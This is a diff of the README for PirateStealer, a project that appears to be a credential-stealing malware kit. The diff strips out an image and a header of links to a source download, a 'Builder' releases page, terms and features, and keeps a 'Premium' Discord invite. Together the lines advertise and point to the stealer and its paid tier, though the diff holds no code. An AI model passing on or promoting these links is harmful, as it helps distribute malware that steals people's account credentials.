@@ -1,7 +1,4 @@
-<img src="https://images-ext-2.discordapp.net/external/1Jdb0c7yGVtglcoB01gaox5YSNYGEdeGjXvhBOP5Caw/https/user-images.githubusercontent.com/66573599/146654766-41c1fdd8-9350-415e-87b2-afbfc17da12a.png?width=366&height=536" data-canonical-src="https://images-ext-1.discordapp.net/external/eDbt8hgeOl5y61eo1Wi_GDLrSjiwF-wL4Sod2hrqnHc/https/gyazo.com/eb5c5741b6a9a16c692170a41a49c858.png?width=319&height=271" align="right" width="70" height="100" />
-
-### [Download](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/archive/refs/heads/main.zip) - [Builder](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/releases)- [Premium](https://discord.gg/9KhkepxNR8) - [Terms](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/#terms) - [Features](https://github.com/Stanley-PirateStealer/PirateStealer-GitHub/#features)
-
+[Premium](https://discord.gg/9KhkepxNR8)
 # PirateStealer
 Official PirateStealer repos
 
